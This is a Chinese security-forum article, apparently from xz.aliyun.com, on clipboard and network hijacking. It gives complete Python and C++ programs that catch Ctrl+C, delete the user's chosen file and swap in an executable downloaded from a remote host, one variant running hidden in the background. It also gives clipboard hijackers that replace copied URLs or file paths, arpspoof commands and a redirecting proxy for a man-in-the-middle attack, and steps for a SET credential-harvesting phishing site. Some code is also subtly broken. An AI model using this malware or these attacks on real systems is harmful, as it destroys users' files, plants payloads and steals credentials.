# 劫持杂谈—被动逃逸-先知社区

> **来源**: https://xz.aliyun.com/news/16635  
> **文章ID**: 16635

---

本代码仅供学习、研究、教育或合法用途。开发者明确声明其无意将该代码用于任何违法、犯罪或违反道德规范的行为。任何个人或组织在使用本代码时，需自行确保其行为符合所在国家或地区的法律法规。

开发者对任何因直接或间接使用该代码而导致的法律责任、经济损失或其他后果概不负责。使用者需自行承担因使用本代码产生的全部风险和责任。请勿将本代码用于任何违反法律、侵犯他人权益或破坏公共秩序的活动。

# 方法一：拦剪切板(更适合WINDOWS)

## (1)替换ctrl+c选中文件

（本文以ctrl+c为样例，具体需要加入右键等判断）

### a.基础部分，拦截ctrl+c：

1. **监听键盘事件（**`**CTRL + C**`**）**。
2. **识别鼠标左键选中的文件**。
3. **对该文件执行操作：删除并从指定URL下载一个文件，并将其重命名为被删除的文件名**。

code:

```
import os
import shutil
import requests
import time
import pyautogui
import keyboard
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from pathlib import Path

# 获取鼠标左键选中的文件路径
def get_selected_file():
    # 使用Tkinter来获取选中文件的路径
    root = Tk()
    root.withdraw()  # 隐藏窗口
    selected_file = askopenfilename()  # 获取选中文件的路径
    return selected_file

# 下载文件并重命名
def download_and_rename_file(selected_file):
    # 下载目标文件并重命名
    download_url = "http://192.168.1.1/1.exe"
    file_name = os.path.basename(selected_file)
    file_dir = os.path.dirname(selected_file)
    new_file_path = os.path.join(file_dir, file_name)

    # 请求文件
    response = requests.get(download_url, stream=True)
    with open(new_file_path, 'wb') as file:
        shutil.copyfileobj(response.raw, file)
    print(f"文件已下载并保存为 {new_file_path}。")

# 删除文件
def delete_file(file_path):
    try:
        os.remove(file_path)
        print(f"文件 {file_path} 已被删除。")
    except Exception as e:
        print(f"删除文件失败: {e}")

# 监听键盘事件并触发相应操作
def monitor():
    print("等待按下 CTRL + C 来执行操作...")
    while True:
        # 如果检测到按下了 CTRL + C
        if keyboard.is_pressed('ctrl+c'):
            print("检测到 CTRL + C 被按下，开始处理文件。")
            selected_file = get_selected_file()

            if selected_file and os.path.isfile(selected_file):
                # 删除选中的文件
                delete_file(selected_file)

                # 下载并重命名文件
                download_and_rename_file(selected_file)

            time.sleep(1)  # 防止多次触发

if __name__ == "__main__":
    monitor()
```

#### 解释：

1. `**get_selected_file()**`：使用 `Tkinter` 打开文件选择对话框，模拟鼠标左键选中文件的操作。此方法返回选中的文件路径。
2. `**download_and_rename_file()**`：下载指定的 `1.exe` 文件并将其保存到被删除文件的目录，并且将下载的文件重命名为被删除文件的名字。
3. `**delete_file()**`：删除选中的文件。
4. `**monitor()**`：这个函数会持续监控是否按下了 `CTRL + C`，如果按下，则调用相应的函数进行文件删除和下载操作。

### b.python要打包，换c++

C++ 实现

```
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <urlmon.h>
#include <shlobj.h>
#include <tchar.h>

#pragma comment(lib, "urlmon.lib")

// Function to delete the selected file
bool deleteFile(const std::wstring& filePath) {
    if (DeleteFile(filePath.c_str())) {
        std::wcout << L"文件 " << filePath << L" 已被删除。" << std::endl;
        return true;
    } else {
        std::wcerr << L"删除文件失败: " << GetLastError() << std::endl;
        return false;
    }
}

// Function to download file from a URL
bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
    HRESULT result = URLDownloadToFile(NULL, url.c_str(), savePath.c_str(), 0, NULL);
    if (result == S_OK) {
        std::wcout << L"文件已下载并保存为 " << savePath << std::endl;
        return true;
    } else {
        std::wcerr << L"文件下载失败: " << result << std::endl;
        return false;
    }
}

// Function to monitor the keyboard event (CTRL + C)
void monitorCtrlC() {
    while (true) {
        // Check if CTRL + C is pressed
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(0x43) & 0x8000) {
            std::wcout << L"检测到 CTRL + C 被按下，开始操作..." << std::endl;
            
            // Ask user for the file path
            OPENFILENAME ofn;
            wchar_t filePath[MAX_PATH] = L"";
            ZeroMemory(&ofn, sizeof(ofn));
            ofn.lStructSize = sizeof(ofn);
            ofn.lpstrFilter = L"所有文件\0*.*\0";
            ofn.lpstrFile = filePath;
            ofn.nMaxFile = sizeof(filePath);
            ofn.lpstrTitle = L"选择一个文件";
            ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

            // Open file dialog to select the file
            if (GetOpenFileName(&ofn)) {
                std::wstring selectedFile(filePath);
                std::wcout << L"选中的文件: " << selectedFile << std::endl;

                // Step 1: Delete the selected file
                if (deleteFile(selectedFile)) {
                    // Step 2: Download the file and rename it
                    std::wstring downloadUrl = L"http://192.168.1.1/1.exe";
                    std::wstring fileName = selectedFile.substr(selectedFile.find_last_of(L"\") + 1);
                    std::wstring savePath = selectedFile.substr(0, selectedFile.find_last_of(L"\")) + L"\" + fileName;

                    if (downloadFile(downloadUrl, savePath)) {
                        std::wcout << L"操作成功完成。" << std::endl;
                    }
                }
            }

            // Prevent multiple triggers of CTRL + C
            Sleep(1000);
        }

        // Small delay to reduce CPU usage
        Sleep(50);
    }
}

int main() {
    std::wcout << L"正在监听 CTRL + C..." << std::endl;
    monitorCtrlC();
    return 0;
}
```

#### 说明：

1. **删除文件 (**`**deleteFile**`**)**：

* 使用 `DeleteFile` API 删除选中的文件。
* 如果文件成功删除，打印成功信息，否则打印错误信息。

1. **下载文件 (**`**downloadFile**`**)**：

* 使用 `URLDownloadToFile` API 从指定 URL 下载文件。
* 文件会下载到选中文件所在的目录，并重命名为删除文件的名字。

1. **监听** `**CTRL + C**`**（**`**monitorCtrlC**`**）**：

* 使用 `GetAsyncKeyState` 函数监控 `CTRL + C` 键（`VK_CONTROL` 和 `0x43` 对应的是 `C` 键）。
* 当按下 `CTRL + C` 时，弹出文件选择对话框让用户选择要操作的文件。
* 然后执行删除文件和下载新文件的操作。

1. **文件选择**：

* 使用 `GetOpenFileName` 来弹出文件选择对话框，允许用户选择要删除的文件。

1. **程序运行**：

* 程序会持续运行，实时监听 `CTRL + C` 事件。当按下 `CTRL + C` 时，它会启动文件操作。

### c.后台执行+睡眠判断

**先转窗体项目**

代码：

```
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <urlmon.h>
#include <shlobj.h>
#include <tchar.h>
#include <thread>

#pragma comment(lib, "urlmon.lib")

// Function to delete the selected file
bool deleteFile(const std::wstring& filePath) {
    if (DeleteFile(filePath.c_str())) {
        return true;
    }
    else {
        return false;
    }
}

// Function to download file from a URL
bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
    HRESULT result = URLDownloadToFile(NULL, url.c_str(), savePath.c_str(), 0, NULL);
    if (result == S_OK) {
        return true;
    }
    else {
        return false;
    }
}

// Function to monitor the keyboard event (CTRL + C)
void monitorCtrlC() {
    int ctrlCCount = 0;  // Counter for CTRL + C activations

    while (true) {
        // Check if CTRL + C is pressed
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(0x43) & 0x8000) {
            ctrlCCount++;

            // When CTRL + C is pressed twice, pause for 20 seconds
            if (ctrlCCount >= 2) {
                std::wcout << L"CTRL + C 被按下两次，程序将休眠 20 秒..." << std::endl;
                Sleep(20000);  // Sleep for 20 seconds
                ctrlCCount = 0;  // Reset the counter after the sleep
                std::wcout << L"休眠结束，继续检测 CTRL + C..." << std::endl;
            }
            else {
                // Ask user for the file path
                OPENFILENAME ofn;
                wchar_t filePath[MAX_PATH] = L"";
                ZeroMemory(&ofn, sizeof(ofn));
                ofn.lStructSize = sizeof(ofn);
                ofn.lpstrFilter = L"所有文件\0*.*\0";
                ofn.lpstrFile = filePath;
                ofn.nMaxFile = sizeof(filePath);
                ofn.lpstrTitle = L"选择一个文件";
                ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

                // Open file dialog to select the file
                if (GetOpenFileName(&ofn)) {
                    std::wstring selectedFile(filePath);

                    // Step 1: Delete the selected file
                    if (deleteFile(selectedFile)) {
                        // Step 2: Download the file and rename it
                        std::wstring downloadUrl = L"http://192.168.1.1/1.exe";
                        std::wstring fileName = selectedFile.substr(selectedFile.find_last_of(L"\") + 1);
                        std::wstring savePath = selectedFile.substr(0, selectedFile.find_last_of(L"\")) + L"\" + fileName;

                        if (downloadFile(downloadUrl, savePath)) {
                            // Operation completed successfully
                        }
                    }
                }
            }

            // Prevent multiple triggers of CTRL + C
            Sleep(1000);
        }

        // Small delay to reduce CPU usage
        Sleep(50);
    }
}

// Entry point for Windows GUI applications
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // Create a new thread for monitoring CTRL + C
    std::thread monitorThread(monitorCtrlC);
    monitorThread.detach(); // Detach the thread to allow it to run in the background

    // Main thread does nothing, just ensures the program continues running
    while (true) {
        // Sleep to avoid CPU overload (you can replace this with other logic)
        Sleep(10000);
    }

    return 0;
}
```

#### 主要改动：

1. `**ctrlCCount**`\*\* 计数器\*\*：每次 `CTRL + C` 被按下时，计数器 `ctrlCCount` 增加 1。
2. **休眠 20 秒**：当 `ctrlCCount` 达到 2 时，程序会输出提示信息，休眠 20 秒，并在休眠结束后重置 `ctrlCCount` 为 0，继续监听 `CTRL + C`。
3. **延迟**：为了防止程序多次激活 `CTRL + C` 事件，增加了 `Sleep(1000)` 来在每次处理完按键事件后进行短暂延迟。

#### 解释：

* **计数器**：通过 `ctrlCCount` 控制 `CTRL + C` 激活次数。当激活两次后，程序会休眠 20 秒，然后重置计数器。
* **休眠操作**：`Sleep(20000)` 让程序暂停 20 秒，期间不再处理 `CTRL + C` 事件。

## (2)粘贴板劫持（替换网址，VX号等）

C++ 代码：当检测到粘贴板有域名，替换为[www.baidu.com](http://www.baidu.com)

```
#include <windows.h>
#include <iostream>
#include <regex>
#include <string>

bool isValidDomain(const std::string& str) {
    // 正则表达式，用于匹配带有协议的 URL (例如 https://www.example.com 或 www.example.com)
    std::regex domainRegex("^(https?://)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/.*)?$");
    return std::regex_match(str, domainRegex);
}

int main() {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return 1;
    }

    // 获取剪贴板上的文本数据
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        std::cerr << "剪贴板没有文本数据!" << std::endl;
        CloseClipboard();
        return 1;
    }

    // 锁定内存并获取数据
    char* pszText = (char*)GlobalLock(hData);
    if (pszText == NULL) {
        std::cerr << "无法锁定剪贴板数据!" << std::endl;
        CloseClipboard();
        return 1;
    }

    // 输出当前剪贴板内容
    std::string clipboardContent = pszText;
    std::cout << "当前剪贴板内容: " << clipboardContent << std::endl;

    // 检查是否是一个域名或 URL
    if (isValidDomain(clipboardContent)) {
        std::cout << "检测到有效的域名，替换为 www.baidu.com" << std::endl;

        // 如果包含协议部分（http:// 或 https://），保留协议
        if (clipboardContent.find("https://") == 0 || clipboardContent.find("http://") == 0) {
            clipboardContent = "https://www.baidu.com";
        } else {
            clipboardContent = "www.baidu.com";
        }
    }

    // 清空剪贴板并设置新的内容
    EmptyClipboard();

    // 分配内存来存储新的剪贴板内容
    size_t len = clipboardContent.length() + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hMem == NULL) {
        std::cerr << "内存分配失败!" << std::endl;
        CloseClipboard();
        return 1;
    }

    // 将数据复制到分配的内存中
    memcpy(GlobalLock(hMem), clipboardContent.c_str(), len);
    GlobalUnlock(hMem);

    // 设置剪贴板内容
    if (SetClipboardData(CF_TEXT, hMem) == NULL) {
        std::cerr << "无法设置剪贴板内容!" << std::endl;
        GlobalFree(hMem);
        CloseClipboard();
        return 1;
    }

    // 关闭剪贴板
    CloseClipboard();

    std::cout << "剪贴板内容已更改为: " << clipboardContent << std::endl;

    return 0;
}
```

### 1. 引入头文件

```
#include <windows.h>
#include <iostream>
#include <regex>
#include <string>
```

* `windows.h`：提供访问 Windows API 所需的函数和常量，用于操作剪贴板等功能。
* `iostream`：提供输入输出流操作，例如 `std::cout` 用于打印信息到控制台。
* `regex`：提供对正则表达式的支持，用于匹配和验证 URL 格式。
* `string`：提供 C++ 字符串类，用于存储和处理字符串数据。

### 2. 定义 `isValidDomain` 函数

```
bool isValidDomain(const std::string& str) {
    // 正则表达式，用于匹配带有协议的 URL (例如 https://www.example.com 或 www.example.com)
    std::regex domainRegex("^(https?://)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/.*)?$");
    return std::regex_match(str, domainRegex);
}
```

* `isValidDomain`：这是一个用于检查字符串是否是有效域名或 URL 的函数。
* `std::regex`：这是 C++11 引入的正则表达式类，用于描述和匹配字符串模式。

* 正则表达式 `^(https?://)?([a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}(/.*)?$` 解释：

* `^(https?://)?`：表示协议部分 `http://` 或 `https://` 可选。
* `([a-zA-Z0-9-]+\\.)+`：匹配一个或多个由字母、数字、或连字符组成的子域（例如 `www.`、`mail.`）。
* `[a-zA-Z]{2,}`：匹配顶级域名（例如 `.com`、`.org`）。
* `(/.*)?$`：匹配路径部分，路径是可选的。

* `std::regex_match`：用来检查传入的字符串是否符合该正则表达式。

### 3. `main` 函数开始

```
int main() {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return 1;
    }
```

* `OpenClipboard`：尝试打开剪贴板以便进行操作。如果失败，返回 `false`，并输出错误信息。
* `std::cerr`：用于输出错误信息，通常会打印到标准错误流。

### 4. 获取剪贴板内容

```
    // 获取剪贴板上的文本数据
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        std::cerr << "剪贴板没有文本数据!" << std::endl;
        CloseClipboard();
        return 1;
    }
```

* `GetClipboardData(CF_TEXT)`：获取剪贴板中的文本数据，`CF_TEXT` 表示文本格式。
* 如果获取失败，输出错误信息并关闭剪贴板。

### 5. 锁定剪贴板数据

```
    // 锁定内存并获取数据
    char* pszText = (char*)GlobalLock(hData);
    if (pszText == NULL) {
        std::cerr << "无法锁定剪贴板数据!" << std::endl;
        CloseClipboard();
        return 1;
    }
```

* `GlobalLock(hData)`：锁定内存并获取剪贴板数据。数据被存储在 `HANDLE` 类型的内存块中。
* 如果无法锁定内存，输出错误信息并关闭剪贴板。

### 6. 输出剪贴板内容

```
    // 输出当前剪贴板内容
    std::string clipboardContent = pszText;
    std::cout << "当前剪贴板内容: " << clipboardContent << std::endl;
```

* `pszText` 是从剪贴板读取的文本数据，将其转换为 C++ 的 `std::string` 类型。
* 输出剪贴板的当前内容。

### 7. 检查是否为有效的域名或 URL

```
    // 检查是否是一个域名或 URL
    if (isValidDomain(clipboardContent)) {
        std::cout << "检测到有效的域名，替换为 www.baidu.com" << std::endl;
```

* 使用 `isValidDomain` 函数检查剪贴板中的文本是否为有效的域名或 URL。
* 如果是有效的域名或 URL，输出信息并开始替换。

### 8. 替换域名

```
        // 如果包含协议部分（http:// 或 https://），保留协议
        if (clipboardContent.find("https://") == 0 || clipboardContent.find("http://") == 0) {
            clipboardContent = "https://www.baidu.com";
        } else {
            clipboardContent = "www.baidu.com";
        }
    }
```

* 如果剪贴板中的内容包含协议（例如 `http://` 或 `https://`），则替换为 `https://www.baidu.com`。如果没有协议，则替换为 `www.baidu.com`。
* `find` 函数检查字符串是否以特定协议开头。

### 9. 清空剪贴板并设置新的内容

```
    // 清空剪贴板并设置新的内容
    EmptyClipboard();
```

* `EmptyClipboard`：清空当前剪贴板的内容，为新的数据腾出空间。

### 10. 分配内存并设置剪贴板内容

```
    // 分配内存来存储新的剪贴板内容
    size_t len = clipboardContent.length() + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hMem == NULL) {
        std::cerr << "内存分配失败!" << std::endl;
        CloseClipboard();
        return 1;
    }

    // 将数据复制到分配的内存中
    memcpy(GlobalLock(hMem), clipboardContent.c_str(), len);
    GlobalUnlock(hMem);

    // 设置剪贴板内容
    if (SetClipboardData(CF_TEXT, hMem) == NULL) {
        std::cerr << "无法设置剪贴板内容!" << std::endl;
        GlobalFree(hMem);
        CloseClipboard();
        return 1;
    }
```

* 使用 `GlobalAlloc` 分配内存来存储新的剪贴板内容。
* `memcpy` 将新的剪贴板内容复制到分配的内存区域。
* `SetClipboardData(CF_TEXT, hMem)` 将新的内容设置为剪贴板数据。

### 11. 关闭剪贴板

```
    // 关闭剪贴板
    CloseClipboard();
```

* 完成剪贴板操作后，调用 `CloseClipboard` 关闭剪贴板。

### 12. 输出修改后的剪贴板内容

```
    std::cout << "剪贴板内容已更改为: " << clipboardContent << std::endl;
    return 0;
}
```

* 输出修改后的剪贴板内容。

## (3)粘贴板劫持（文件替换）

### 代码：

```
#include <windows.h>
#include <iostream>
#include <string>

// 将文件路径设置到剪贴板
void SetFilePathToClipboard(const std::string& filePath) {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return;
    }

    // 清空剪贴板
    EmptyClipboard();

    // 分配内存来存储文件路径
    size_t len = filePath.length() + 1; // 包含终止符 '\0'
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hMem == NULL) {
        std::cerr << "内存分配失败!" << std::endl;
        CloseClipboard();
        return;
    }

    // 将文件路径复制到内存
    memcpy(GlobalLock(hMem), filePath.c_str(), len);
    GlobalUnlock(hMem);

    // 将文件路径设置到剪贴板 (CF_HDROP 格式)
    if (SetClipboardData(CF_HDROP, hMem) == NULL) {
        std::cerr << "无法设置剪贴板内容!" << std::endl;
        GlobalFree(hMem);
        CloseClipboard();
        return;
    }

    // 关闭剪贴板
    CloseClipboard();

    std::cout << "剪贴板内容已更改为: " << filePath << std::endl;
}

int main() {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return 1;
    }

    // 检查剪贴板是否包含文件路径（CF_HDROP）
    if (IsClipboardFormatAvailable(CF_HDROP)) {
        // 获取文件路径（CF_HDROP 格式）
        HANDLE hData = GetClipboardData(CF_HDROP);
        if (hData == NULL) {
            std::cerr << "剪贴板没有文件数据!" << std::endl;
            CloseClipboard();
            return 1;
        }

        // 获取文件路径
        char* pFilePath = (char*)GlobalLock(hData);
        if (pFilePath == NULL) {
            std::cerr << "无法锁定剪贴板数据!" << std::endl;
            CloseClipboard();
            return 1;
        }

        std::cout << "剪贴板内容是文件路径: " << pFilePath << std::endl;

        // 复制目标文件路径到剪贴板，假设目标文件是 D://1.exe
        SetFilePathToClipboard("D://1.exe");

        // 关闭剪贴板
        CloseClipboard();
        return 0;
    }

    std::cerr << "剪贴板没有文件路径!" << std::endl;
    CloseClipboard();
    return 1;
}
```

### 1. **头文件和命名空间**

```
#include <windows.h>
#include <iostream>
#include <string>
```

* `windows.h`：这是包含 Windows API 函数、常量和类型定义的头文件。我们在这里使用它来操作剪贴板、内存分配等。
* `iostream`：用于输入和输出操作。在这里我们使用 `std::cerr` 和 `std::cout` 来输出错误和日志信息。
* `string`：C++ 字符串类，用于处理字符串。

### 2. `**SetFilePathToClipboard**`\*\* 函数\*\*

```
void SetFilePathToClipboard(const std::string& filePath) {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return;
    }

    // 清空剪贴板
    EmptyClipboard();

    // 分配内存来存储文件路径
    size_t len = filePath.length() + 1; // 包含终止符 '\0'
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hMem == NULL) {
        std::cerr << "内存分配失败!" << std::endl;
        CloseClipboard();
        return;
    }

    // 将文件路径复制到内存
    memcpy(GlobalLock(hMem), filePath.c_str(), len);
    GlobalUnlock(hMem);

    // 将文件路径设置到剪贴板 (CF_HDROP 格式)
    if (SetClipboardData(CF_HDROP, hMem) == NULL) {
        std::cerr << "无法设置剪贴板内容!" << std::endl;
        GlobalFree(hMem);
        CloseClipboard();
        return;
    }

    // 关闭剪贴板
    CloseClipboard();

    std::cout << "剪贴板内容已更改为: " << filePath << std::endl;
}
```

**功能：** 这个函数的目标是将文件路径 (`filePath`) 设置到剪贴板中。

* `**OpenClipboard(NULL)**`：打开剪贴板。如果剪贴板无法打开，则返回错误并输出 `"无法打开剪贴板!"`。
* `**EmptyClipboard()**`：清空剪贴板中的内容。
* **内存分配和复制文件路径**：

* `size_t len = filePath.length() + 1`：计算文件路径的长度（加上终止符 `\0`）。
* `HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len)`：分配内存空间来存储文件路径。`GlobalAlloc` 分配全局内存，`GMEM_MOVEABLE` 表示内存可以被移动。
* `memcpy(GlobalLock(hMem), filePath.c_str(), len)`：将文件路径内容复制到分配的内存空间中。
* `GlobalUnlock(hMem)`：解锁内存，允许进一步的操作。

* **将数据设置到剪贴板**：

* `SetClipboardData(CF_HDROP, hMem)`：将文件路径作为 `CF_HDROP` 格式数据设置到剪贴板。`CF_HDROP` 是用于表示文件路径的剪贴板格式。

* **释放资源**：

* `CloseClipboard()`：关闭剪贴板，完成操作。
* 输出 `"剪贴板内容已更改为: D://1.exe"` 表示操作成功。

### 3. `**main**`\*\* 函数\*\*

```
int main() {
    // 打开剪贴板
    if (!OpenClipboard(NULL)) {
        std::cerr << "无法打开剪贴板!" << std::endl;
        return 1;
    }

    // 检查剪贴板是否包含文件路径（CF_HDROP）
    if (IsClipboardFormatAvailable(CF_HDROP)) {
        // 获取文件路径（CF_HDROP 格式）
        HANDLE hData = GetClipboardData(CF_HDROP);
        if (hData == NULL) {
            std::cerr << "剪贴板没有文件数据!" << std::endl;
            CloseClipboard();
            return 1;
        }

        // 获取文件路径
        char* pFilePath = (char*)GlobalLock(hData);
        if (pFilePath == NULL) {
            std::cerr << "无法锁定剪贴板数据!" << std::endl;
            CloseClipboard();
            return 1;
        }

        std::cout << "剪贴板内容是文件路径: " << pFilePath << std::endl;

        // 复制目标文件路径到剪贴板，假设目标文件是 D://1.exe
        SetFilePathToClipboard("D://1.exe");

        // 关闭剪贴板
        CloseClipboard();
        return 0;
    }

    std::cerr << "剪贴板没有文件路径!" << std::endl;
    CloseClipboard();
    return 1;
}
```

**功能：**`main` 函数主要负责检查剪贴板是否包含文件路径，并且如果包含文件路径，则替换为 `D://1.exe`。

* **打开剪贴板**：首先调用 `OpenClipboard(NULL)` 打开剪贴板，如果失败，则输出错误并退出程序。
* **检查剪贴板内容格式**：

* `IsClipboardFormatAvailable(CF_HDROP)`：检查剪贴板中是否包含文件路径。`CF_HDROP` 是表示文件路径的剪贴板格式。

* **读取剪贴板中的文件路径**：

* `HANDLE hData = GetClipboardData(CF_HDROP)`：获取剪贴板中的文件路径数据（`CF_HDROP` 格式）。
* `char* pFilePath = (char*)GlobalLock(hData)`：锁定内存区域，获取文件路径数据。

* **输出文件路径**：

* `std::cout << "剪贴板内容是文件路径: " << pFilePath << std::endl;`：输出当前剪贴板中的文件路径。

* **设置新的文件路径到剪贴板**：

* 调用 `SetFilePathToClipboard("D://1.exe")`，将 `D://1.exe` 路径设置到剪贴板中。

* **关闭剪贴板**：最后调用 `CloseClipboard()`，关闭剪贴板。
* **错误处理**：

* 如果剪贴板中没有文件路径，或者其他任何步骤出现错误，程序会输出相应的错误消息并退出。

# 方法二：MITM(更适合LINUX)

## (1)ARP跳转到仿站(以192.168.10.5为例)

使用 ARP 欺骗（ARP spoofing）攻击将流量重定向到特定的 IP 地址（例如，将所有流量定向到百度）是一种中间人攻击技术（Man-in-the-Middle, MITM）。通过 ARP 欺骗，你可以伪造网络设备的 ARP 响应，欺骗目标设备将它的流量发送到你的机器，而不是目标 IP。

### 攻击步骤：

1. **伪造 ARP 响应**：将 `192.168.10.5` 的网关 ARP 表条目修改为你的机器的 MAC 地址。
2. **拦截并转发流量**：你将接收到 `192.168.10.5` 发出的流量，之后你可以将所有 HTTP 请求转发到 `www.baidu.com`，实现流量劫持。

### 1. **概念讲解：**

#### ARP 欺骗（ARP Spoofing）：

ARP (地址解析协议) 用于将 IP 地址映射到 MAC 地址。当设备在局域网中要与另一个设备通信时，它会通过 ARP 请求找到目标设备的 MAC 地址。在 ARP 欺骗攻击中，攻击者发送伪造的 ARP 响应，将其自己的 MAC 地址告诉目标设备，以便将目标设备的流量引导到攻击者的机器。

### 2. **操作步骤：**

我们将使用 ARP 欺骗工具（如 `arpspoof`）来进行攻击。攻击者的机器需要伪造 ARP 响应，将目标设备 `192.168.10.5` 的流量重定向到攻击者的机器上，然后攻击者再将所有流量转发到 `www.baidu.com`。

### 3. **在 Linux 上使用** `**arpspoof**`**：**

**安装** `**dsniff**` **套件（包含** `**arpspoof**` **工具）**：

```
sudo apt-get install dsniff
```

#### 伪造 ARP 响应：

1. **伪造网关的 ARP 响应**：首先，获取目标设备 `192.168.10.5` 的网关 IP 地址。假设网关 IP 为 `192.168.10.1`。
2. **将目标设备的流量重定向到攻击者机器**：

```
sudo arpspoof -i eth0 -t 192.168.10.5 192.168.10.1
```

该命令会发送伪造的 ARP 响应，将 `192.168.10.5` 的默认网关指向你的机器。这样，当 `192.168.10.5` 发送数据时，流量会被发送到你的机器，而不是目标网关。

1. **拦截流量并将流量重定向到百度**： 使用一个简单的代理服务器来转发流量。你可以使用 Python 来创建一个代理服务器，或者直接使用 `iptables` 将流量转发到百度。

#### 使用 Python 创建简单的代理服务器（将流量转发到百度）：

```
python
import socket
import requests

# 简单的代理服务器
def handle_client(client_socket):
    request = client_socket.recv(1024)
    print(f"Request received: {request}")

    # 将所有流量转发到百度
    baidu_response = requests.get('https://www.baidu.com')

    # 将百度的响应返回给客户端
    client_socket.send(baidu_response.content)
    client_socket.close()

def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 8080))  # 监听所有的网络接口和8080端口
    server.listen(5)
    print("Proxy server listening on port 8080...")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        
        # 启动新线程处理客户端请求
        handle_client(client_socket)

# 启动代理服务器
start_proxy()
```

### 4. **将 ARP 欺骗与代理服务器结合使用：**

* 启动 ARP 欺骗，将 `192.168.10.5` 的流量重定向到攻击者机器。
* 启动 Python 代理服务器，将所有 HTTP 请求转发到 `www.baidu.com`。

### 5. **监控和清理：**

1. **监控攻击**：你可以使用 Wireshark 等工具监控网络流量，确保流量被重定向并访问百度。
2. **清理 ARP 欺骗**：攻击结束后，使用以下命令清除 ARP 缓存并恢复网络：

```
sudo ip -s -s neigh flush all
```

## (2)搭建仿站**SET**

### 1. **安装 Social-Engineer Toolkit (SET)**

#### 在 Kali Linux 上安装 SET：

Kali Linux 默认预装 SET，所以你只需要打开终端并输入以下命令来确认它已安装：

```
setoolkit
```

如果你使用的是其他 Linux 系统，你可以通过以下命令来安装 SET：

```
sudo apt update
sudo apt install set
```

### 2. **启动 Social-Engineer Toolkit**

在 Kali Linux 或其他 Linux 系统上，打开终端并运行以下命令启动 SET：

```
sudo setoolkit
```

### 3. **选择伪站攻击选项**

SET 提供了多种攻击选项，其中之一是创建一个伪造网站，伪装成你想模仿的网站（例如百度、Facebook、Google 等）。以下是使用 SET 伪造网站的步骤。

#### 1. **选择攻击类型**

启动 SET 后，你会看到一个菜单选项。使用键盘选择选项来进行伪造网站攻击。

```
Select from the menu:

1. Social-Engineering Attacks
2. Penetration Testing (exploitation)
3. Wireless Attacks
4. Create a payload and listener
5. Mass Mailer Attack
6. Third Party Modules
7. Update SET

> 1
```

选择 **Social-Engineering Attacks** 进行社会工程学攻击。

#### 2. **选择网站钓鱼攻击**

接下来，你会看到一组攻击选项。选择与伪造网站相关的选项：

```
1. Website Attack Vectors
2. Infectious Media Generator
3. Create a custom payload and listener
4. Create a malicious file
5. Social Engineering Quick Attack
6. Exit

> 1
```

选择 **Website Attack Vectors**，即网站攻击向量。

#### 3. **选择网站钓鱼（伪站）**

在下一步中，你将看到多个伪造网站选项。SET 提供了一个预构建的伪造站点库，包括百度、Facebook、Google、Yahoo 等。选择你想要仿造的网站，或者选择自定义网站。

```
1. Java Applet Attack Method
2. Metasploit Browser Exploit Method
3. Credential Harvester Attack Method
4. Social-Engineering Attack Method
5. Exit
> 3
```

选择 **Credential Harvester Attack Method** 来创建一个伪造的钓鱼网站，收集用户凭据。

#### 4. **选择伪站目标**

SET 会让你选择一个你想要伪造的网页类型。例如，如果你想创建一个百度的伪站，你可以选择“百度”或输入自定义 URL。

```
1. Web Templates
2. Custom Web Template
> 1
```

选择 **Web Templates**（Web 模板），然后选择你要仿造的网站。SET 会从模板中选择一个现成的页面进行伪造。

#### 5. **启动伪站**

SET 会自动设置伪造网站并开始监听。你将得到一个本地服务器地址，目标用户访问这个伪造网站后，所有输入的凭证（如用户名、密码）将被记录到 SET 中。

```
Enter the IP address to host the fake site:
> 192.168.1.10
```

输入本地 IP 地址，或者使用 **0.0.0.0** 来让伪站在所有接口上监听。

#### 

### 4.下马，具体不在这里体现
